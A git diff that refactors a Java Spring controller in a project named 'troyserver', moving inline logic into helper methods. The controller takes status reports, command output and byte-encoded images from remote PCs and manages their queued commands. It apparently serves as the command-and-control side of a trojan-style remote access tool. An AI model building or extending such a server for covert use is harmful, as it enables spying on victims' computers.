@@ -1,11 +1,11 @@
 package ch.lebois.troyserver.controller;
 
-import ch.lebois.troyserver.data.Client;
-import ch.lebois.troyserver.data.ClientRepository;
-import ch.lebois.troyserver.data.Image;
-import ch.lebois.troyserver.data.ImageRepository;
-import ch.lebois.troyserver.data.Message;
-import ch.lebois.troyserver.data.MessageRepository;
+import ch.lebois.troyserver.data.entity.Client;
+import ch.lebois.troyserver.data.repository.ClientRepository;
+import ch.lebois.troyserver.data.entity.Image;
+import ch.lebois.troyserver.data.repository.ImageRepository;
+import ch.lebois.troyserver.data.entity.Message;
+import ch.lebois.troyserver.data.repository.MessageRepository;
 import ch.lebois.troyserver.service.ImageService;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
@@ -27,6 +27,7 @@ public class ServerReceiverController {
     private ImageRepository imageRepository;
 
     private ImageService imageService;
+    private Client client;
 
     public ServerReceiverController(ClientRepository clientRepository, MessageRepository messageRepository,
                                     ImageService imageService, ImageRepository imageRepository) {
@@ -41,12 +42,7 @@ public class ServerReceiverController {
                           @RequestParam(name = "type", defaultValue = "") String typeParam,
                           @RequestParam(name = "value", defaultValue = "") String valueParam) {
 
-        Client client = clientRepository.findOne(clientParam);
-        if (client == null) {
-            client = new Client();
-            client.setPcName(clientParam);
-            clientRepository.save(client);
-        }
+        client = getClient(clientParam);
 
         switch (typeParam) {
             case "os":
@@ -55,43 +51,16 @@ public class ServerReceiverController {
             case "online":
                 break;
             case "img":
-                for (String s : valueParam.split("_")) {
-                    try {
-                        bytes.add(Byte.valueOf(s));
-                    } catch (NumberFormatException ignored) {
-                    }
-                }
-                client.setCommands("");
+                addBytes(valueParam);
+                clearCommands();
                 break;
             case "imgend":
-
-                Message loadingMessage = new Message();
-                loadingMessage.setPcNameFk(clientParam);
-                loadingMessage.setType("commandout");
-                loadingMessage.setText("Creating Img");
-                messageRepository.save(loadingMessage);
-
-                String fileName = imageService.getImage(bytes, clientParam);
-                bytes = new ArrayList<>();
-
-                Image image = new Image();
-                image.setPcNameFk(clientParam);
-                image.setName(fileName);
-                imageRepository.save(image);
-
-                Message imgMessage = new Message();
-                imgMessage.setPcNameFk(clientParam);
-                imgMessage.setType(typeParam);
-                imgMessage.setText("Saved img: " + fileName);
-                messageRepository.save(imgMessage);
+                createMessage(clientParam, "commandout", "Creating Img");
+                createMessage(clientParam, typeParam, "Saved img: " + createImg(clientParam));
                 break;
             default:
-                client.setCommands("");
-                Message defaultMessage = new Message();
-                defaultMessage.setPcNameFk(clientParam);
-                defaultMessage.setType(typeParam);
-                defaultMessage.setText(valueParam);
-                messageRepository.save(defaultMessage);
+                clearCommands();
+                createMessage(clientParam, typeParam, valueParam);
                 break;
         }
 
@@ -99,5 +68,48 @@ public class ServerReceiverController {
         clientRepository.save(client);
 
         return "receiver";
+    }
+
+    private Client getClient(String clientParam) {
+        Client client = clientRepository.findOne(clientParam);
+        if (client == null) {
+            client = new Client();
+            client.setPcName(clientParam);
+            clientRepository.save(client);
+        }
+
+        return client;
+    }
+
+    private void addBytes(String valueParam) {
+        for (String s : valueParam.split("_")) {
+            try {
+                bytes.add(Byte.valueOf(s));
+            } catch (NumberFormatException ignored) {
+            }
+        }
+    }
+
+    private String createImg(String clientParam) {
+        String fileName = imageService.getImage(bytes, clientParam);
+        bytes = new ArrayList<>();
+
+        Image image = new Image();
+        image.setPcNameFk(clientParam);
+        image.setName(fileName);
+        imageRepository.save(image);
+        return fileName;
+    }
+
+    private void clearCommands() {
+        client.setCommands("");
+    }
+
+    private void createMessage(String clientName, String messageType, String messageValue) {
+        Message message = new Message();
+        message.setPcNameFk(clientName);
+        message.setType(messageType);
+        message.setText(messageValue);
+        messageRepository.save(message);
     }
 }
